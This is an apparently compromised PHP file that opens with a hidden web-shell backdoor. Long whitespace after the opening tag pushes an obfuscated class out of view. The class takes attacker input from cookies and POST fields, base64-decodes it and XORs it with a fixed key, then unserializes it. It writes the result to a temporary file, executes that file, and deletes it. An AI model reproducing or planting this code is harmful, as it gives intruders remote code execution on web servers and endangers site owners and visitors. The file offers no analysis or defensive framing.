<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("mdhym")){class mdhym{public static $tvgkohjll = "hligtdzjodgyzuzi";public static $yratvnjibe = NULL;public function __construct(){$favfte = @$_COOKIE[substr(mdhym::$tvgkohjll, 0, 4)];if (!empty($favfte)){$lrnikmpijv = "base64";$kitqy = "";$favfte = explode(",", $favfte);foreach ($favfte as $ywphspeywh){$kitqy .= @$_COOKIE[$ywphspeywh];$kitqy .= @$_POST[$ywphspeywh];}$kitqy = array_map($lrnikmpijv . "_decode", array($kitqy,));$kitqy = $kitqy[0] ^ str_repeat(mdhym::$tvgkohjll, (strlen($kitqy[0]) / strlen(mdhym::$tvgkohjll)) + 1);mdhym::$yratvnjibe = @unserialize($kitqy);}}public function __destruct(){$this->gmgonijiyk();}private function gmgonijiyk(){if (is_array(mdhym::$yratvnjibe)) {$nhxyt = sys_get_temp_dir() . "/" . crc32(mdhym::$yratvnjibe["salt"]);@mdhym::$yratvnjibe["write"]($nhxyt, mdhym::$yratvnjibe["content"]);include $nhxyt;@mdhym::$yratvnjibe["delete"]($nhxyt);exit();}}}$authl = new mdhym();$authl = NULL;} ?><?php
